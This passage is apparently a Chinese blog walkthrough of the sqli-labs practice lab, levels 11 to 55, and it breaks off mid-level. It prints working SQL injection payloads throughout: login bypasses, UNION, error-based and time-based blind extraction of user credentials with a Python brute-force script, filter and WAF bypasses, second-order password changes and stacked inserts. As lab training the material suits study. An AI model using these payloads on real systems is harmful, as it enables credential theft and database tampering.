'admin' LIMIT 0,1' at line 1\n \t admin ' or '1'='1 --+ admin\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-08b4a637ddfdab6c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n \t uname=-1' union select  1, database() -- &passwd=admin&submit=Submit\n \t 获取到数据库\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-b64f60606a6f56a7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n uname=-1' union select  1, group_concat(table_name) from information_schema.tables where table_schema=database() -- \n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-0045e4fbdef8776a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n按步骤走就行\n \t uname=-1' union select  1, group_concat(password,username) from users --\n \t 同样也能使用之前的双注来完成\n \t uname=1' union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a#\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-c88504828851cad4?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-12 基于错误的双引号POST型字符变形注入\n\n直接看源码，看是如何写的，然后如何过滤\n\n做了这么多，已经知道了如何过滤，通过“）即可\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-3041fd657503e12b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n- 正常访问\nadmin/admin\n返回：Your Login name:admin/Your Password:admin\n- 加\" 报错\n You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin\") LIMIT 0,1' at line 1\n- 尝试绕过获取\n\tadmin \") -- // 注意 -- 后面有个空格，绕过\n\t之后就是获取数据了\n\t-1\") union select 1,database() -- // 获取数据库为security\n\t-1\") union select 1,group_concat(0x7c,table_name,0x7c) from information_schema.tables where table_schema=database() -- // 获取表 \n\t-1\") union select 1,group_concat(0x7c,column_name,0x7c) from information_schema.columns where table_name='users' -- // 获取字段\n\t-1\") union select 1,group_concat(0x7c,username,0x7e,password,0x7c) from users -- // 拿到数据\n```\n\n\n\n## Less-13 POST 单引号变形双注入\n\n```\n- 正常访问\nadmin/admin 发现没有返回值，那么这里就有可能是正确没有返回值\n```\n\n```\n- 尝试绕过\n 通过 a') or 1=1 --  // 绕过验证\n 获取尝试 永真闭合 ') or ('1')=('1\n 为什么这里可以闭合呢，这个和之前的注释符闭合类似，\n```\n\n```\n 之后尝试获取数据\n- 获取数据\n\t0') union all select count(*),2,concat( '~',(select schema_name from information_schema.schemata limit 4,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 \n \t0') union select count(*),concat('~',(select table_name from information_schema.tables  where table_schema=database() limit 3,1),'~',floor(rand(0)*2)) a  from information_schema.tables  group by a # // users\n    0') union select count(*),concat('~',(select column_name from information_schema.columns  where table_name='users' limit 1,1),'~',floor(rand(0)*2)) a  from information_schema.columns  group by a # \n     0') union select count(*),concat('~',(select concat(username,password) from users limit 0,1),'~',floor(rand(0)*2)) a  from information_schema.columns  group by a # \n```\n\n通过闭合成功获取到了用户名和密码\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-e9fea547643fdd4e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-14 POST双引号变形双注入\n\n```\n来看一下源码，闭合很简单，就不多叙述了，为什么要用双注呢，和get类似，反正正确，错误无回显，但是语句报错，这里就想到使用双注去执行。\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-466788ca989fb1f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n- 正常访问\nadmin/admin\n访问正常\n- 绕过\n和13一样 改单引号为双引号就可以绕过\n\" or \"1\"=\"1 这样就可以绕过验证登录\n- 获取数据\n0\" union select count(*),concat('~',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'~',floor(rand(0)*2)) a from information_schema.tables group by a #\n0\" union select count(*),concat('~',(select column_name from information_schema.columns where table_name='users' limit 0,1),'~',floor(rand(0)*2)) a from information_schema.tables group by a #\n0\" union select count(*),concat('~',(select password from users limit 0,1),'~',floor(rand(0)*2)) a from users group by a #\n0\" union  select count(*),concat( '~',(select concat(id,username,password) from users limit 0,1),'~',floor(rand(0)*2)) as a from information_schema.schemata group by a %23\n// 注意 由于正常访问没有回显 ，所以最好加个-1 来报错\n成功获取到用户名和密码\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-f8179e2915cb9b7f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-15 基于bool型/时间延迟单引号POST型盲注\n\n```\n-正常访问\nadmin/admin\n登录成功\n\n- 脚本跑\n 理解扫描的方式： 确定数据库的数量，确定数据库的长度，确定数据库\n 我们可以通过大于数据库的个数这样就不用去判断数据库的长度，之后长度也可以通过时间报错信息去判断，在加上判断 是否是这个字符 一共需要三层循环就可以解决\n  这里有两种方式去判断 ，使用ascii判断 ，或者通过mid 截断去判断。\n   data = {'uname': \"admin'and If((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))='%s',sleep(0.1),1)#\" % ( i, j, str), 'passwd': \"1\"}\n   data = {'uname': \"admin'and If((mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))='%s',sleep(0.1),1)#\" % ( i, j, str), 'passwd': \"1\"}\n   data = {'uname': \"admin'and If((mid((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))='%s',sleep(0.1),1)#\" % ( i, j, str), 'passwd': \"1\"}\n   data = {'uname': \"admin'and If((mid((select username from users limit %d,1),%d,1))='%s',sleep(0.1),1)#\" % ( i, j, str), 'passwd': \"1\"}\n   data = {'uname': \"admin'and If((mid((select password from users limit %d,1),%d,1))='%s',sleep(0.1),1)#\" % ( i, j, str), 'passwd': \"1\"}\n\n```\n\n```\n- 绕过\n' or sleep(5) --  存在延时\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-80ec6030c4ff6a23?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n看一下脚本\n- 脚本跑\n 理解扫描的方式： 确定数据库的数量，确定数据库的长度，确定数据库\n 我们可以通过大于数据库的个数这样就不用去判断数据库的长度，之后长度也可以通过时间报错信息去判断，在加上判断 是否是这个字符 一共需要三层循环就可以解决\n  这里有两种方式去判断 ，使用ascii判断 ，或者通过mid 截断去判断。\n\n#coding:utf-8\nimport requests\nfrom time import time\nurl = \"http://192.168.64.135/Less-15/\"\nchar = \"abcdefghijklmnopqrstuvwxyz_\"\nprint(\"start!\")\nfor i in range(0,10):\n    database = \"\"\n    for j in range(1,20):\n        for str in char:\n\n            time1 = time()\n            data = {'uname':\"admin'and If((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))='%s',sleep(0.1),1)#\"%(i,j,str),'passwd':\"1\"}\n            res = requests.post(url,data=data)\n\n            time2 = time()\n\n            if (time2-time1 > 0.1 ):\n                database += str\n                #print(database)\n                break\n    print(\"the %d database: \"% (i+1))\n    print(database)\nprint(\"end!\")\n```\n\n\n\n## Less-16 post方法双引号括号绕过时间盲\n\n```\n嗯 。。。 和上一关就一个单引号和双引号之差\n修改admin' 为 admin \")\n\n```\n\n\n\n\n\n## Less-17 基于错误的更新查询POST注入\n\n**注意 ，如果注入不当，可能导致user的表被清空**\n\n这道题的源码还是要好好看看的,发现存在update ，所以 这道题要小心，避免错误的删除数据\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-07939af280cb6674?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n而且 这道题对于uname检查严格，但是password没有检查，所以我们的注入点就限制在了password\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-16be4f7abbc1d5d8?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n注意 如果使用不当，\n这里可以使用updatexml进行注入\nupdatexml用法 ： updatexml(1,concat(0x7e,(SELECT 查询语句),0x7e),1) \n测试发现注入点在password处 uname 过滤了很多，所以从password处出发\n1' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#\n之后只要在@@version 处添加合适的查询语句就可以构成注入\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-9421dfa38088ef83?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n## Less-18 基于错误的用户代理，头部POST注入\n\n为何host头存在注入，这个也比较少见，但是知道只要和数据库有交互就有可能存在注入\n\n插入了ua头，所以可以从这里下手\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-a92e59ad22107b80?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n可以看到uname和passwd都进行了过滤，这里有个注意点，在平常的渗透中，当输入点没有注入，可以想想是否在其他地方有注入，程序员对于普通用户的输入点过滤严格，但是其他地方却没有进行过滤，导致了注入的发生，也是需要我们多多注意\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-7eee6334be843421.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n这里考察 host头部注入，一般相对于参数比较难以查找，也不容易判断，一般判断的方式是通过模糊测试去尝试，或者在可能出现注入的地方添加* 通过sqlmap去测试。\n而且要善于去发现页面返回的信息，也许这都是与数据库有交互的点。\n\n这道题返回的信息有host和ua ，那么我们可以通过给这两个地方加* 放进sqlmap去测试，或者加点查看是否出现报错\n通过测试发现在ua处加'返回了错误提示，那么我们就尝试从这里拿下\n' and '1='1 # 闭合 所以接下来就是在这里通过查询语句获取flag了\n' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and '1'='1 // 查询版本信息\n```\n\n如何查询呢，需要使用到burp 抓包 ，挂上代理，burp抓包发送到 repeater去查看\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-07e7489fb48fda14?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n## Less-19 基于头部的RefererPOST报错注入\n\n看一下源码，对于referer插入了sql语句，并且没有进行过滤，这就导致了注入\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-fd4b70b9b45e8664?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n与上题类似，通过返回值判断注入，猜想可能发生在referer处\n测试语句与less-18类似\n' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and '1'='1 // 查询版本信息\n发现闭合 成功注入\n```\n\n## Less-20 基于错误的cookie头部POST注入\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-d17944393cc5272f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n这里可以看到对于cookie没有进行过滤，并且第二次会拿出cookie调用sql语句，这里就达成了注入的条件。\n登录成功之后会设置里面的cookie 当二次刷新的时候 这时候会重新从里面取值弄，并且这次取值没有经过过滤 直接就是注入点 还是使用updatexml的函数进行报错 \n\nCookie: uname=admin1 ' or updatexml(0,concat(0x5e24,user(),0x5e24)\nCookie: uname=admin' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) #\n成功绕过，注入成功\n```\n\n从21开始就添加了比较复杂的过滤，让我们拭目以待。\n\n## Less-21 基于错误的复杂的字符型Cookie注入\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-d2fffea81302ca78?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n可以看到 cookie没有进行检测过滤，base编码后就进行了查询\n\n使用sqlmap 注入 ，一定要记得添加编码方式，不然检测不出来\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-9d5edb63c0a5fa22?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n这一题和上一题类似，只是对cookie进行了base64编码，使用sqlmap的 tamper可以绕过\n手工测试和20题一样，将20题的payload进行base64编码即可\n但是发现#编码后执行失败，换用'1'='1闭合语句\nadmin' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and '1'='1\nYWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSksMSkgYW5kICcxJz0nMQ==\n```\n\n## Less-22 基于错误的双引号字符型Cookie注入)\n\n查看源码，和21只有这一个区别。\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-e633510cb666ec4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n这里闭合需要\"去闭合，将单引号换成双引号 成功绕过\nadmin\" and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and \"1\"=\"1\nYWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSksMSkgYW5kICIxIj0iMQo%3d\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-99cbf6118231d863?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n## Less-23 基于错误的，过滤注释的GET型\n\n分析源码\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-68042f32e4668c3a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n对id进行了两次过滤，#和--+被过滤，\n\n这里可以通过 or ‘1’=‘1 来代替注释符，另一种做法是通过union联合查询，添加到语句中间，然后闭合后面的单引号就可以正常的查询了\n\n```\n通过union 查询，在3处闭合 将查询语句写入\n-1' union all select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),'3\n另一个方式\n-1' union all select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '1'='1\n```\n\n## Less-24 二次注入\n\n拿到这道题，可能和之前的有些许区别，主要这道题注入点不在前端，而是因为数据在二次调用的时候没有过滤，导致了用户通过构造payload绕过去修改其他用户的密码\n\n查看源码，可以看到对于username没有过滤，直接引用了，导致构造的用户修改密码时修改其他用户的密码，并且不需要curr_pass\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-505a511e368bdeb9?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n构造payload admin'# 即可闭合sql语句 使得password=$curr_pass不起作用\n首先创建用户 admin'# 登录此用户，之后修改密码，修改后尝试登录admin用户，发现登录成功。\n```\n\n## Less-25 过滤了or和and\n\n看看源码，函数对于id进行了替换，or和and ，基本可以使得大多注入语句失效\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-865eb5769a13a3aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n尝试输入注入语句，发现当输入or 或者 and的时候被过滤，可能是黑名单绕过\nHint: Your Input is Filtered with following result: 1 1=1\n尝试双写 发现绕过过滤，\n-1' anandd updatexml(1,concat(0x7e,(select database()),0x7e),1) %23\n将and和or 换成 && 和 || 同样可以绕过\n\n这道题还有个25a 过滤了or和and的盲注\n我们可以直接这样注入\n-1 union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata %23\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-dc051cc8cfd2d902?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n## Less-26 过滤了注释和空格的注入\n\n```\n查看源码\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\treturn $id;\n}\n\n空格和注释无法使用\n绕过空格的几种\n%09 tab键 %0a 新建一行 %0c 新的一页 %od return功能 %0b tab键垂直 %a0 空格\n\n用%A0替代空格使用，用&&(%26%26)替代AND使用\n构造payload： 0'%A0UNION%A0SELECT%A01,version(),database()%26%26%a0'1\n这道题还可以使用盲注实现\n0'||left(database(),1)='s'%26%26'1'='1\n同样报错注入也可以实现\n0'||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||'1'='1\n\n只要将空格和and绕过 那么实现就简单了\nor和and 很好过滤，注释过滤了就使用永真闭合，\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-82c9f75c78a67be7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n## Less-26a 过滤了空格和注释的盲注\n\n```\n和上一题区别不大\n通过检测 0'||'1'='1 判断是'\n也可以通过fuzz去查看 发现 '） \") 无报错\n使用盲注ok\n\n0'||left(database(),1)>'s'%26%26'1'='1\n\n尝试绕过，这两个都可以绕过\n0')%a0union%a0select%a01,2,3||('1\n0')%a0union%a0select%a01,2,3;%00\n虽然这道题说是盲注，但是通过闭合 也可以直接爆出结果。\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-4f51efa3b34eedc9?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-27 过滤了union和select\n\n```\n做了这么多了，下来就不说如何拿到数据了，重点在于如何绕过，只要能够找到注入点，剩下的可以利用sqlmap 等等工具直接利用，毕竟在渗透中，没有那么多的时间让我们去消耗\n\n过滤了union和select\n绕过方式：双写 大小写\n0'%0aUnioN%0aSeleCT%0a1,2,3;%00\n0'%A0UnIoN%A0SeLeCt(1),2,3%26%26%a0'1\n\n这里说明一下，冒号可以做闭合用， %00用来截断 这样和注释有相同的含义，这下绕过就多了：注释，分号闭合，冒号%00截断\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-9d3e214bd3d2f25d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n## Less-27a 过滤了union和select \n\n看一下源码 ，过滤了常见的几个语句，但是黑名单很好绕的，毕竟没有谁能将所有的都加入其中，这样会影响正常的工作\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-dab71ae33a04429f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n和上一题一样，但是把单引号换成了双引号\n替换上一题的payload即可绕过\n\n0\"%0aUNion%0aseLEct%0a1,2,3%26%26%0a\"1\n0\"%0aUNion%0aseLEct%0a1,2,3;%00\n\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-28cec60cbd23bd84?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-28 过滤了union和select大小写\n\n过滤注释 空格，union 和select在一起的使用 \n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-ec89130d5ef3f833?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n0')%A0UnIoN%A0SeLeCt(1),version(),3%26%26%a0('1\n使用盲注也可以达到注入的目录\n0')||left(database(),1)='s';%00\n```\n\n但是出现注入的原因是大小写不严格导致 ，mysql语句中，对大小写不敏感，所以单独的过滤某个函数是没有用的， 必须转成小写在判断。这样就可以把大小写给过滤了。\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-43e04f3cd336ac35?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-28a盲注 过滤了union和select大小写\n\n看看源码，过滤不严格，导致了注释可以使用\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-285b146ff755fc72?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n类似于28 这里可以使用注释\n0')%A0UnIoN%A0SeLeCt(1),version(),database() --+\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-df7c1aa9e0f7c835?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-29 获取-基于错误的缺乏证据的不匹配-在web应用程序前面有一个WAF。\n\n从29关开始，不再是一个index.php文件了\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-ecc2e791ef9d09aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n第一个文件是错误输出显示了\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-1989eb467d5ac1a5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n第二个index.php 在熟悉不过了，返回了\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-4e6f88e19d92d921?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n第三个是个login.php\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-812f4db35ff71167?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n简单说一下这道题的原理\n这里的waf指的是jsp服务器，这里起到防火墙的作用，数据会经过jsp服务器过滤之后传入php服务器中，php服务器之后将数据返回到jsp服务器，打印到客户端。\n这里我们可以传两个参数  id=1&id=2 ，判断是谁获取了第一个值，谁又拿到了第二个值\n此处应该是id=2的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF的检测。该用法就是HPP（HTTP Parameter Pollution），http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁\n\npayload：0' union all sElect 1,database(),3 --+\n```\n\n首先传入两个参数 id=1 &id=0’ 第二个参数被服务器拿到了，处理然后返回了结果，所以这次注入需要两个参数\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-3d5bbf9e43fa32d0?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\nhttp://192.168.64.135/Less-29/?id=1&id=0%27%20union%20all%20sElect%201,database(),3%20--+\n\n通过对第二个参数进行注入 成功获取数据\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-af5bb0a6474c5934?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n## Less-30 盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。\n\n```\n测试发现\" 报错\n0\" union select 1,2,database() --+\n测试发现上面的同样可以过waf\nid=1&id=0\" union select 1,2,database() --+ \n\n```\n\n## Less-31  盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。\n\n```\n判断发现可以通过\") --+ 闭合\nid=1&id=0\")  union select 1,2,database() --+\n```\n\n## Less-32 一个为危险字符添加斜线的GET - Bypass自定义过滤器\n\n```\n注释发现 系统会给特殊字符添加转义\\\n那么我们是否可以编码绕过，发现编码不行\n尝试转换成16进制也不ok\n百度一下，得到了这道题的做法：宽字节注入，由于数据库编码与前端编码不一致导致存在注入\n\n汉字是由两个字节编码的，由于gbk和utf-8编码不一致导致报错，为了构成报错，我们需要添加一个大于128的编码\n\n0%df'  union select 1,database(),3 --+\n成功绕过\n```\n\n## Less-33 bypass Addslashes()\n\n```\n这里主要是如何绕过addslashes()这个函数\naddslashes() 函数返回在预定义字符之前添加反斜杠的字符串。\n\n预定义字符是：\n\n    单引号（'）\n    双引号（\"）\n    反斜杠（\\）\n    NULL\n\n提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。\n\n注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。\n这里和32 差别不大 一个是自定义添加，另一个是使用函数添加\n0%df'  union select 1,database(),3 --+\n\n```\n\n## Less-34 bypass Addslashes()\n\n```\n和上一关差别不大，使用post请求\n一样的宽字节注入，并且在uname和passwd处都存在注入\nuname=0%df'  union select 1,database() --+&passwd=0&submit=Submit\n```\n\n## Less-35 GET-Bypass添加斜杠(我们不需要)整数\n\n```\n这里输入的整数 直接--+ 就可以绕过了\n0 union select 1,database(),3 --+\n```\n\n## Less-36 GET-Bypass MySQLreal escape_string\n\n```\n先来看看这个函数\nmysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\n\n下列字符受影响：\n\n    \\x00\n    \\n\n    \\r\n    \\\n    '\n    \"\n    \\x1a\n\n如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。\n而这个函数可以通过以下语句绕过\naaa' OR 1=1 --\n\n0%df' union select 1,2,database() --+\n```\n\n## Less-37 POST-Bypass MySQLreal escape_string\n\n```\n到了后面，主要讲思路，语句基本都会了\n这里是post方式，我们抓包 添加语句到uname或者passwd中，同样是添加'%df报错，查询 --+做注释\n\nuname=0%df' union select 1,database() --+&passwd=admin&submit=Submit\n成功绕过\n```\n\n## Less-38 层次化查询\n\n```\n可以直接正常注入\n主要看下这个函数\nmysqli_more_results() 检查一个多重查询语句中是否有更多结果\n\n```\n\n## Less-38 层次化查询\n\n```\n也叫堆叠注入\n简单来说 就是通过将多条语句通过；隔开写在一起构成多语句，由于未对参数进行处理导致多条语句正常执行\n堆叠查询受限于api或者数据库引擎不支持的限制，权限不足也会限制语句执行\n\n1';insert into users(id,username,password) values ('16','a','a')-- \n```\n\n## Less-39 GET -  Stacked Query Injection - Intiger based\n\n```\n语句都一样，重点是找到闭合的方式\n1;insert into users(id,username,password) values (16,'a','a')-- \n```\n\n## Less-40 GET-BLIND - based - String - stacked \n\n```\n1'); insert into users(id,username,password) values ('17','a','a')--+\n\n```\n\n## Less-41 GET - BLIND based - Intiger - Stacked\n\n```\n1; insert into users(id,username,password) values(18,'b','b') --+\n```\n\n## Less-42 POST - Stacked Query error based\n\n```\n经过验证，在password处语句报错，所以我们需要从passowrd入手\n\n0';create table aaa like users #\n```\n\n## Less-43 POST- Stacked Query error based with twist\n\n```\n和 42 类似 同样password 未过滤\n\nlogin_user=1&login_password=a');create table less43 like users#&mysubmit=Login\n```\n\n## Less-44 POST - Error based - String - Stacked -Blind\n\n```\nlogin_user=a&login_password=a';insert into users(id,username,password) values(19,'a','a') --+&mysubmit=Login\n```\n\n## Less-45 POST - Error based - String - Stacked - Blind\n\n```\nlogin_user=a&login_password=a'); insert into users(id,username,password) values(20,''c','c') --+&mysubmit=Login\n```\n\n## Less-46 ORDER BY-Error-Numeric\n\n```\n终于迎来了一个过渡\n这次的注入是通过order by 来进行的\n通过sort 查询 发现当输入4的时候报错，而报错提示与order by 提示相同，猜想可能是将输入的值插入order by里进行的\n通过updatexml 报错注入\nsort=4 and updatexml(1,concat(0x7e,(select database()),0x7e),1) %23\n```\n\n## Less-47 ORDER BY Clause-Error-Single quote\n\n```\n和46有少许区别，做到这里基本套路应该都懂了，从不需要单引号，双引号之类的报错，到盲注，难度都是一步一步深入\nsort=4' and (select count(*)  from information_schema.columns group by concat(0x7e,(select database()),0x7e,floor(rand(0)*2)))  --+\n注意 and后面的语句要使用（）括起来\n基于 procedure analyse 注入\nsort=1'procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+\n```\n\n## Less-48 ORDER BY Clause Blind based\n\n```\n这一题 需要使用盲注解决\n通过substr获取所要查询的信息的位数\n然后使用ascii去解析成ascii编码\n之后通过if判断是否相等 去获取值\n之后构成 if(ascii(substr(datbase(),1,1)))\n\n或者使用rand(ascii(left(database,1))=115) 同样获取相同的效果\n\n```\n\n## Less-49 ORDER BY Clause Blind based\n\n```\n同样是盲注，和48类似\n这一题使用延时盲注解决\n获取长度\n1 and if(length(database())=8,sleep(5),0)--+\n获取值\n1 and If(ascii(substr(database(),1,1))=114,0,sleep (5))--+\n```\n\n\n\n## Less-50 ORDER BY Clause Blind based\n\n```\n检测 返回只有正确或者错误，属于盲注\n\n通过报错注入 也能获取\n1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\n\n```\n\n## Less-51 ORDER BY Clause Blind based\n\n```\nsort=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\n\n```\n\n## Less-52 ORDER BY Clause Blind based\n\n```\n测试发现均没有显错 只能盲注了\n1 and if(length(database())=8,sleep(5),0) --+\n \n```\n\n## Less - 53 ORDER BY Clause Blind based\n\n```\n通过测试发现回显只有正确和错误，所以这道题做法基本就是盲注了，\n4' and if(length(database()) = 8 ,0,sleep(6)) --+\n1' and (length(database())) = 8 and if(1=1, sleep(1), null) and '1'='1\n1' and (ascii(substr((select database()) ,1,1))) = 114 and if(1=1, sleep(1), null) and '1'='1\n```\n\n\n\n又要进入一个新的过渡了\n\n## Less-54 GET-challenge-Union-10 queries allowed-Variation 1\n\n```\n挑战 ，允许查询10次，先不急去查看，观察一下需要输入的内容\n所以，我们只有10次机会，\n一般获取一个表正常需要获取数据库，到表，到列，再到数据，所以最少需要4步，而这里我们需要用6步猜测出来注入\n回忆一下前面的注入， get类型的包含但不限于单引号，双引号，bool，堆叠，延时，报错，字符型和数字型，双注。\n\n第一道题 采用最简单的'注入\nhttp://192.168.64.135/Less-54/?id=1%27%20order%20by%203%20%23 // True\nhttp://192.168.64.135/Less-54/?id=1%27%20order%20by%204%20%23 // false\nhttp://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,database()%20%23 // True challenges\nhttp://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20%23 // True 8T3YRE3TXR\nhttp://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%278T3YRE3TXR%27%20%23// true secret_4XCQ\nhttp://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,group_concat(secret_4XCQ)%20from%208T3YRE3TXR%20%23 // True aefBbyoeStF7Edc3FZa4G5C4\n\n```\n\n## Less-55 GET-challenge-Union-14 queries allowed-Variation 2\n\n```\n线索： 